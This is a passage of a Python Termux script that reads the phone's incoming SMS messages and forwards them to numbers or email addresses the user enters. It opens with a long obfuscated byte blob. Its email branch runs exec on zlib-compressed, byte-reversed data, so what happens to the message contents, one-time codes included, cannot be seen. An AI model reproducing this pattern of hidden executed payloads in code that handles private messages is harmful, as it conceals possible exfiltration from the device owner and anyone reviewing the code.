\xc6\x8eN>\x9b\xed\xbd\x03\xa5Po\xe8\xf4\t\xcb\x8a\xf4\x8b\xde\x8d\x19\xe1\xde\xd5\xf09Q\xaf\x1a\x16\xd5\xd9\x9c(\xac\x1a\x94d\xf3l\xbd\x98\xf6\x17\xca\xee\xf1P\xb1b_U\x85\xfci\xf8\xd1\xcd\xd5\xfa\xea\xf9\xfe\xafGF/\xa5bS\xc0@h\xa8\xf4k\xf9\xf2\x8cH?\xac\xa3\x89o\xb2&\xec/\xcb]\xfe\x91]\xfdVz\xcfC+F?\x14i\xb0\xcc\xc6\xf2e\xa4\x18\xb6\xdcx\xc9\xd1\x8f_\x1b\xeb\xae\xb76\xa7\x9e\x07\x1f|q\xb6\xc60\xd5\x14\x0e\xecFOk9\xe3\xb5\xdb\xb7y\x86\xa9\xc5C.lo\xde\xdb-\xfd+oB]\xcd\xf2\xdd\xe3\xb8\xaf\x17~\xe1\xf8\xb0\xe7v\x1a\xb6\xc3ocl\x98\xfb\xca\x17p\xa3(X\x12\xee\xaf\x1d\x91\x17*`%~\xeax\xdb\r3\xed<\xe0Bc\xdc\x8a#\xbfun\xd8\x13l\x11\x1b\xb6\t\xb3\xa8\x0e\'c\xec0\xd6\xbb\xa1\x87\xde\x94\xa6\xde\xe8\x9b\xc5X}\xba\x8dB\x1f\xb4\xad\xed\xc0\xf9QH\xfb`\xd8l\xfa1I\x00q"`\xf2\xc4@K\x01\xcbrc\x0c|\xab_\xdb\xcb\xf9{}\xbdyW-\xa6\x99M|\xf8\xafl\xbeR\xb1J\x12\xa0\xb5\x1f>x\x84\xd3cq\x97\xf2\xe2\xe8\xc7\x18Ki,u\xac\x9a\xffC#\x9f\xd3\xfa\xe6\xe4\xf6\xa7\xd0\xa8@@]\xe2z\x11$|\x15gbP\xe2|\xach@/&V=nM4\xf9\xe1\x05&r\xd9\x9a\xd6t\xc6\xcf\xea\xac\xa6W,B\x9eP\xee\xa3H~Nsk^Yc\x1bU\xf6F\xc5\xea\xefd\x04S?\xf6c\xd3k\xbc\xa8\xd6\xd3<\xecwO\xc4t4O`\xa07\x8c$\xe5\x18+\x85C\xd7\x8e\xc1\x10\xf2\x84\x93\x84\x92.H,=$#\xc7h\x87\xe2<\xfc\xd74\x01sJ\xb4!\xec\x81\x97d<\x9b\x89s$&\xfa\x03\xfb\xebLt\x8b\xfe\xa5\x8c\x9f\xc5G\xad\xc5w\xa3\xf4i4\xb1\xeb\xdcs\x03\x0e\x11\xc9\xf5\xb0\x18c\x19r\xb2\n%J\xf2\x80\xd6\x19\xca\x1b\xe77=\n5\xf4\xbd\x1e,\xefF\xea\t\xe8\x94\x93\xff\x11h\xef\xfb\xde\x94^\xd5\xed\xce\x916\xa9\x17`\x97\xb9\xc7\xd0K\xf4\x92=\xa2W\xb6I\xf7\t^\xc6F\xf7\x07\xb5\x10\x0b\xd9\x87x\x06\xe9\x87\xa7y\x1e\xe1\x8aT\x02\x0c7s\xca\x9f\xd4\xf2\x07i\xa7\xe8gvc\xed\x9b\xe3\x0bQ5\x88+\xa03.<V\xf9\xbe\xb9\xbd>1\xe3\x88\x9fvA7\xf4\xc1\xbe\x8c6E\xe5S]:k5\xa3\xf40\xb5dP\x0e\x18\xe6\x89wTKM\x0c\xf8i\x876~\xf1\xa8_\xe5\x90k\xd9\xe8ao9\xc9E\xc5\x1c\xf2@g\x08x\x93\xce3\x9f<z+R\xa1\x91\x82\x0c\xea\xff\xa5\xafvx\xfd\x97\t\xa0c\xba\xd4\xb1w\xb20\xf1\xd2\x8b\xa4%\xd5\x90e\xec\xea\x1f\xcd\xb3G \xf6n/v\xc9\xc1\x9d\xf9\x90\x05\xb1\xfa2^\xeb\xebS\xcd\x9f/\xc7\xb2JO\xa7^\x8a\xfd:\xd9\xf2T}9\x1a\x07\x82\x8f\xe4\x12\xf4}\x86\x9f4\xf2\x88~\xa3\xd0\xb2\x08\xac\x0f\xf9p\xa4\x1e\x8a\xf3\xe9W\xafGGG\xe4\xd2\xacG\xb8E\xdb\xed\xc3\xcb\x0fo\xb5\xbdMg\xf2\x16\x05R\xe9\xaanw\xcbmK\xdb\xa5\xdb;\x94\x1dYU\x88:\xca\xceN\xb9\xc9B\xcb\x18\xdd\xa2\xb6\xf9\xa0V\xe5S\xe6\xef\x86[1\xbf\xcb\xb9\\\xc7&_\xf3\x87<\x87\xbd#Q40\xb4\xf9\xd6\xff\x94<\xf5-\xf8\xa0\rg\xef\xa6c\x01\x99\x8c,\xf8\xc8\xc6\xb8\x91\xde\x84\x95\xd3\x01\x85\x93\xee\n\x8a\xa5/M\x19\xc9\xe6/\xd4;\xd3O\x9d\xdd\xdd\x9a|\xef\xfc\xf7/j\x13\x1d\x9a!\xfd\x18}U\xb4\x18\xbd\xbf\x9e@5\xd52\xd5\xf2\xee\x9eZu5\xdb\xdd\xb4+a\x90l8M\x87\xed!\x97\x0fd\x9b\xacyf\xf7\xfcIC\xfeMx\x94\x89\xae\x9f\xd3\n\x19\xbfgb\x10\xd5\xa6\xb1\x08mI\xf2\xd1{+\xad1\x17\xb2\x1c\xedt\xb4\xea\x85\xb3\x83\xcc\xa2\x0bY\xaf\xcd]\xe2\x03\xa30\xbb\x90\xec\xa7P\x83\xf5\xd4\x8a\x9b\xa5\xc1cx\xa6T\xb3\xd8\xf9\xd2X\xd9y\xab\xc0\xf6\x15&\xee:o\xab\x94\xb6z\xdd\x93\xeb@?\xf6\x18{\xd0\xb6\xaeO[9~\xc05GS\xc6\x87\xad9\x0c\xbe\xee\xb7\t9\xea\xc9y8\xaa\x9b\x83L9\x0c\x88)\xb5\x83A"\xef\x86\xe7\xd6\n]\xf2,\xf6\xb2S\xaeD=\x89\xd2F\x1c\xfbF\xab\'^\xe4SZ\xea\xc8E6N\xd4\xb9C\x82&\xd4\xa8{d\x0f\xd4hs\xeb3\xd5/\x0f49C\x82\xa7\x1a\xfe\xd2\xaba\xf5\x82|A\xdd\xc8\xf9\xac\xb0sy:u\xbb\x8c\r^\xb3\x96\x03W\xd4\xf9\x80\xbb\xc8\r@\x93\xe5\x83_\xe6\xb2\xacj\xd12\xf1:\xce\x8d\xbb{\x83\xda|\tzsj\xb5\x03\x0c\xa8(zjgY\x14\xb8\xdbz7\x9bb\xa8\xd1s \x8a\x04 \x8e\x92\x1d\xfc\xce#\x14\xb8\x80\xd7\xeb\x10\xd7L\xf5\xb1<\xf2f5\x1c\xb4\xd2H[\x94\\Q\x1a\xcc\xe4\xb4\xb7\'V\xe1\xbc\xa3\xc8\x1d@\xd5\xdak\x88"c\xc5(Y\xa7R\xbe\xb9\x04\xfdM\xa9*f\xe6+\tu\xd4y\x0bc\xcf\x95\xe4\x06\x04*\xbbU\x0e\xc4<`)\xf9Y\x81;5\xbd\xfa\x95t\xef0#T\x06E\x83NRc\xa6\n\x82I.\xa4\x1b:\xab\x19\xf4AB\xe5\x8fZ\x16\xec\x0c\xd4C\xb3Qxb\xe7\xf7\xf7#\xba\xf8\xe8\xd0\xbd\x0e\xe7K\xab\xa2\xda\xe9Y\'\xb9\xd8\xbd\xa1&\xe9\xae\x17\xdf\xc0\xb2cL\xd2\x82L@\xd6V\x93q\xb4T8\xe8\xd6aU\x1a\x19\x1c\xb2\xc7\xcf\xcexp\xee\xb6=9\xd3\xafz\x0ch\xbaE\xaa\xe9\xe4\x1d\xdd\xb0((f\xe2\xda\xcf\x98\x1e9:\xad\x83VcM\xa7CeAa\xb2\xfa\x8d\xed\xdfsoq!\xd3\xba\xd7\x8aIe\x12\xda)\xd4\xd5\xa7!\xc1\xa9\t\x13\xae\xf6\xefV\xc3$\xbfG\xf4\xdbp\x93\xa2\xea}\xc6\xe1\x04e\xcf\xc3\xf0\x99\x19\xc1\xc5\xe4\n\x86~\xd5\xd0\xe1Z\x8d\xb3\xf5\x94\x98\xcb\xfbz\xf3\t\x0e\xa6\x82\xd5j\x03J\xcb\x12\xa5\x85\xb7J\x96$\x04\xb9\xbd\x05\xac\x0e\xc5s\x94o\x8e\xd0\x88?P\xdaS\x81p\xe2]\x15\x9a\xedt\xbd\xbf\x9d\x9e v\x8b&\xa2@\xac\x9f\x17\x06\x92\xeaH\x0f0Z\xa3\xba\xa4\xb9\x0c\xd7\xfd\xd0\xa4\x12\xa7\xd2\x10\xb2\xfa\xe4\xb8\xaf\x178X!,\xc3E\xc9\xcb5\x0f\xf63\x80\xca\t\xab\xe1`\xff\xeeo\xd3\xf2*\xb9\x9dcR\x07\xcc\x02\xa9\x0e\x0e\xa6\x06\xcbBZ]\x05\x15\x92\xcf\xbfB)Y\xc2&\xbc\xd4\xa2\xec\xfc\xd5&\xe5\xeaN\xf3N\x9a\xcf7\xb9\xe2\xcc\xbe\x97\x07m\xcb\xce\xe2Vq\xcb&H\xb09\xf2Y\xbb\x16\xf3\xef\xb2\xcf\xbe\xcd;\xc5\xcaI\xde8\x99\x84\xbft\xea\xb2\xba|\x9b\x7fx\xb2\xf9K\x82\x1dY\x88e?\xeb\x0e\xfd\xae=\xcaf2\x19\xafjE\xd1\x0e\xaf\x16Y\'_B\x1f\xb9\xb7\xdb\xab\xcaL\xb4,\x13\xe3\x98"\xb8r\n\xf4\xa5\xd5!\x06\xbe~7Px\xa5\r\x006\xcb\x90P,L\xcc\x19\xf6\x9e2\x16z\xc3\xea\xc5a\x87\x02\xc7\xbbm\xa2\x96\xb3\xa1i"\xf7P\x11`\xf5w\x9f&\xebk\x1b\x0e\xb1\xc8\xa0as\x01\x0e\xfdd3\xdd\xe8\x00\x9f2\x14$\xebj\xd8~*\xa5 yU\x88\xdb\x00\xa9;^\x14\x8a\x95\x9c\xb8\xbb\x88\x8e\xe5\xe0W\x9d\x03Iz8\xa4p\x81\xbc\xb5\xdc\xee}\xb5d\x18\xfa\x19R\xe5\xa0\xa2\x03\xc1\x8c!\xd1;I\xf6/<\xf2f\xc6\xb0\xf1AX5\xc4`\x9a8B\x8a\x11\r\x95c\xd8\x0c{J\x0br\x8c\x94\xddg\xdc\xa7=\xe2\x02\xc4$\x96D\x12\x87\x1f\x13m{a\xa4\xfbl(\xb32\xb0\x86\xf1K\x85UT\x91\xb7\xbb\x13U\t\xf4\xda\x18\xd5Y\xed\t\xba\xecB\x03\x96hY\x94\xd6 \xaa^ra`\xa7\xb5\xd0\x8fLFS\xec\x1c\xdb\x87\x9c\x9e\xd2\x00\xfaI(\xd6\xe2K\x14\xa2\xdaf\x10\xb6\xb6Q\xe5s\x80\xc9\xa3C\x01G}\x89\x89\xe4*\xba\x08\x92\x9aL\xc4\x90\xb3\xbf\xa8\x0e\x15\xcd\x1d\x02\xb4\xa7/\xfd\x1b\xd5\xa7\xed\xc0\xe7\xdc:k\x98\x8f\x05\xad\xdc\xec\x0f%wu\x92\x91x\xbd?\x05*\xf6l\xc9\xd0\xb3\x95M\xbc\x02\xd1\xcf\xfc\x11:\x9b!b]\xc0fg(\xac}\xc8E\\\nM f`\xcb\xbc\x8c\xe3\x10\xb4F\xb9\xb2\x10\xaeLz5\x83D!^\x97j\x96^\xa0SO\x98\x89p\xb1\x88\xb9\x1fA\xbe\xb9\xbc\xb2|\xaa(\xe9\xcc\xbc\xd1\xf4\xfe\xff\x16\xa2HXx\xe4;\xc8-SU\xb2*\x88T\x02\x04\xfc\xc6JC\xe3\x0b7D}\xc94*S\xcaIi\xa0fd\xc9\xc5\x93\xec\x1d)\xbe\xc5\x15CH1\xc7\xe4\xccC\xa8l\x97\x0byWS\x11\x85\xa9\x84S8r\x06P\xb9\x0e$\xa1\xb1\x85\x90\x1c1\x18Q\x01\x08\xd4\xbb`o\x82\xfd<\xc5\xf2\xfe\x05O \x90\xbbQ\xdc\xba_\xcc\x80#\xa3\xa3\x81\x01]\xbf\xf7\x9b\x9b\xab\xeb\xfcS\x9f\xf4\x06\xbf`\x95\xb1\xf3\xa2dc\x02R\x8d\x84\xf9\x195\xb3\x02C(\x8a \\V?$a\x90-\x02\xc1\xb3\xe0\x81z\xd8\xf8\xae\x17R\xec\x10O)\x18\xf8_\x821\xc4M\x81E\x88\xc7"\xb1r?\xa9\x80U\xeea\r\xd0\xac\x97$\xa3~\xe7\x87\x87\xcb\x1a.\xb0\xfb;N\xdd\xfb\xa8{\xef\xf2\t\xd9e$*D\x89\x8bh\x92\x82\x8bi}\xdd \x182,\x1d\x9d7n\x98\xdbUI\xd6\xe7l\x8d=\x8d\xd0j\xc1_\xbd\xf68\xdbn\xdb\x1a\xd5\x9cx'))

def SendNumber(to, data):                 # Define a function called SendNumber with two parameters to and data
    def SendNumberCheck(number, data):    # Define a nested function called SendNumberCheck with two parameters number and data
        try:
            subprocess.getoutput(f"termux-sms-send -n {number} {data}")   # Use the subprocess module to send an SMS message to the specified number
            details = json.loads(subprocess.getoutput("termux-sms-list -l 10 -t all"))   # Use the subprocess module to get details of the last 10 SMS messages
            for data in details:            # Loop through the details of the messages
                try:
                    if ("".join(data["received"].split(" ")[1].split(":")[:-1]) != time.strftime("%H%M")):  # Check if the received time of the message matches the current time
                        if (data['sender'] == 'You'):      # Check if the sender of the message is the user
                            if (data['type'] == 'failed'):  # Check if the message sending failed
                                return False              # Return False if any of the checks failed
                except: pass
            return True                         # Return True if all checks passed
        except: return False                    # Return False if an exception occurred during message sending or message checking
    if not (SendNumberCheck(to, data)):        # Call the nested function SendNumberCheck with the specified number and data, and check if it returned False
        finaltxt=""
        for i in range(((Arrange(os.get_terminal_size().columns).columns) - 2) // 2)-21: finaltxt += " "   # Generate a message to be displayed if message sending failed
        sys.stdout.write("\r"+finaltxt+f"{magenta}[{red}!{magenta}] {white}Could Not Send Message      {yellow}"), print(), print()   # Display the message
    else:                                     # If SendNumberCheck returned True
        finaltxt=""
        for i in range(((Arrange(os.get_terminal_size().columns).columns) - 2) // 2)-21: finaltxt += " "   # Generate a message to be displayed if message sending succeeded
        sys.stdout.write("\r"+finaltxt+f"{magenta}[{yellow}*{magenta}] {white}Message Send                {yellow}"), print(), print()  # Display the message

STORE, ID = [], ""
def SendSMS(TO, SVE):
    try:
        global ID
        details = json.loads(subprocess.getoutput("termux-sms-list -l 10 -t inbox -n"))
        for data in details:
            SmsID = data["_id"]
            if (time.strftime("%Y-%m-%d")) == (data["received"].split(" ")[0]) and ("".join(data["received"].split(" ")[1].split(":")[:-1])) == (time.strftime("%H%M")):
                SmsID = str(SmsID)
                if (re.search(SmsID, ID)) : SMSLBAR()
                else:
                    subprocess.getoutput("timeout 3 termux-toast -b white -c black -g middle -s sms received")
                    subprocess.getoutput("timeout 3 termux-toast -b white -c black -g middle -s forwarding message")
                    for to in TO:
                        if (SVE): _ = lambda __ : zlib.decompress(__[::-1]);exec((_)(b'\xf0"\xb3h\x00M|\x92\xf9 \x95)\xf9I\x15p\xea)\x99)\x89\xa9E\x19%\xea\xf8\xc1)\x16\xa5&\xe6\x95\xe7\xc9\x85\x886\x8c\xd2PRP\xd1,\xc9\xc8.+\xd5\x8aQMK,\xcdNMJ*V\x8cI,IHQ\xd2S\xc9\xf0.+6(\x084KrP\xd1\xcc\xccM\xcdqK\xcdN\x0b\x9cx'))
                        else: SendNumber(to, data["body"])
                    ID += SmsID
            else: SMSLBAR()
    except KeyboardInterrupt: EXIT(False)
    except json.decoder.JSONDecodeError :
        finaltxt=""
        for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-21): finaltxt += " "
        sys.stdout.write("\r"+finaltxt+f"{magenta}[{red}!{magenta}] {white}Could Not Send Message      {yellow}"), print(), print()
    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

def SMSLBAR():
    finaltxt=""
    for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-21): finaltxt += " "
    sys.stdout.write("\r"+finaltxt+f"{magenta}[{yellow}*{magenta}] {white}Waiting For New Messages...")

def EmailMenu():
    try:
        Banner()
        if not (Internet()):
            print()
            center(f"{red}╔══════════════════════════════════════════╗",5)
            center(f"{red}║    {blue}Check your internet connection...     {red}║",15)
            center(f"{red}╚══════════════════════════════════════════╝",5)
            center(f"{red}╔══════════════════════════════════════════╗",5)
            center(f"{red}║           {blue}Choose An Option...            {red}║",15)
            center(f"{red}╠══════════════════════════════════════════╣",5)
            center(f"{red}║         {magenta}[{white}01{magenta}]  {yellow}BACK TO MAIN MENU          {red}║",30)
            center(f"{red}║         {magenta}[{white}02{magenta}]  {yellow}TRY AGAIN                  {red}║",30)
            center(f"{red}║         {magenta}[{white}03{magenta}]  {yellow}EXIT                       {red}║",30)
            center(f"{red}╠══════════════════════════════════════════╝",5)
            center(f"║{Space(42)}")
            Input = INPUT("╚════► ")
            if (Input == "1") or (Input == "01") or (Input == "one"): MENU()
            elif (Input == "2") or (Input == "02") or (Input == "two"): EmailMenu()
            elif (Input == "3") or (Input == "03") or (Input == "three"): EXIT()
            else:
                center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║              {blue}Invalid Option              {red}║", 15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            sleep(2)
            MENU()
        else:
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║      {blue}Enter emails separated by '{green},{blue}'       {red}║", 25)
            center(f"╠══════════════════════════════════════════╝")
            center(f"║{Space(42)}")
            Input = INPUT("╚════► ")
            Emails = Input.split(",")
            Filter = []
            for email in Emails:
                if (email == ""): continue
                else: Filter.append(email)
            if (len(Filter) == 0): EmailMenu()
            Banner()
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(Box(f"{white}Forwarding SMS To "+str(len(Filter))+" Emails", red+"║   ", " ", red+"  ║", 44, "center", resultprint=False), 15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║       {white}For stop press ( {magenta}ctrl + c {white})        {red}║", 25)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            print(yellow)
            finaltxt=""
            for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-23): finaltxt += " "
            sys.stdout.write("\r"+finaltxt)
            while True: SendSMS(Filter, True)
    except KeyboardInterrupt: EXIT(False)
    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

def PHMenu():
    try:
        Banner()
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(f"{red}║  {blue}Enter mobile numbers separated by '{green},{blue}'   {red}║", 25)
        center(f"╠══════════════════════════════════════════╝")
        center(f"║{Space(42)}")
        Input = INPUT("╚════► ")
        Numbers = Input.split(",")
        Filter = []
        for number in Numbers:
            if (number == ""): continue
            else: Filter.append(number)
        if (len(Filter) == 0): PHMenu()
        else:
            Banner()
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(Box(f"{white}Forwarding SMS To "+str(len(Filter))+" Phone Numbers", red+"║   ", " ", red+"  ║", 44, "center", resultprint=False), 15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║       {white}For stop press ( {magenta}ctrl + c {white})        {red}║", 25)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            print(yellow)
            finaltxt=""
            for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-23): finaltxt += " "
            sys.stdout.write("\r"+finaltxt)
            while True: SendSMS(Filter, False)
    except KeyboardInterrupt: EXIT(False)
    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

def MENU():
    try:
        Banner()
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(f"{red}║           {blue}Choose An Option...            {red}║", 15)
        center(f"{red}╚══════════════════════════════════════════╝\n",5)
        center(f"{magenta}[{white}01{magenta}]  {yellow}Forward Messages Via Email          ",20)
        center(f"{magenta}[{white}02{magenta}]  {yellow}Forward Messages Via Phone Number   ",20)
        center(f"{magenta}[{white}03{magenta}]  {yellow}About Tool                          ",20)
        center(f"{magenta}[{white}04{magenta}]  {yellow}Usage                               ",20)
        center(f"{magenta}[{white}05{magenta}]  {yellow}Update Tool                         ",20)
        center(f"{magenta}[{white}06{magenta}]  {yellow}More From Us                        ",20)
        center(f"{magenta}[{white}07{magenta}]  {yellow}Exit....                           \n",20)
        center(f"{red}╔═══════════════════════════════════════════",5)
        center(f"║{Space(42)}")
        Input = INPUT("╚════► ")
        if (Input == "1") or (Input == "01") or (Input == "one"): EmailMenu()
        elif (Input == "2") or (Input == "02") or (Input == "two"): PHMenu()
        elif (Input == "3") or (Input == "03") or (Input == "three"): About()
        elif (Input == "4") or (Input == "04") or (Input == "four"): Usage()
        elif (Input == "5") or (Input == "05") or (Input == "five"): Update()
        elif (Input == "6") or (Input == "06") or (Input == "six"): os.system("termux-open-url https://github.com/GreyTechno"), MENU()
        elif (Input == "7") or (Input == "07") or (Input == "seven"): EXIT()
        else: 
            center(f"{red}╔══════════════════════════════════════════╗",5)
            center(f"{red}║       {magenta}Invalid Option Try Again...        {red}║",15)
            center(f"{red}╚══════════════════════════════════════════╝",5)
            finaltxt=""
            for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-21): finaltxt += " "
            sys.stdout.write("\r"+finaltxt)
            sleep(2)
            MENU()
    except KeyboardInterrupt: EXIT(False)
    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

# line checks whether the current script is being run as the main program or if it has been imported into another script. If it is being run as the main program, the code within the following block will be executed.
if (__name__ == "__main__"):
    sys.stdout.write(f"\r{yellow}Checking Updates...") # prints the message "Checking Updates..." to the console with the text color in yellow.
    # The termux_api() function is called and checks if the Termux API is available on the device. If the API is not available, the Installer() function is called to install the Termux API
    if not (termux_api()): Installer()
    # If the API is available, Internet() function is called to check if there is an internet connection. If there is an internet connection, CheckVersion() function is called to check for updates.
    else:
        # Finally, if there is no command detected (i.e., cmd() returns False), the MENU() function is called to display the main menu.
        if (Internet()): sys.stdout.write(f"\r{yellow}Checking Updates..."), CheckVersion()
        if not (cmd()): MENU()
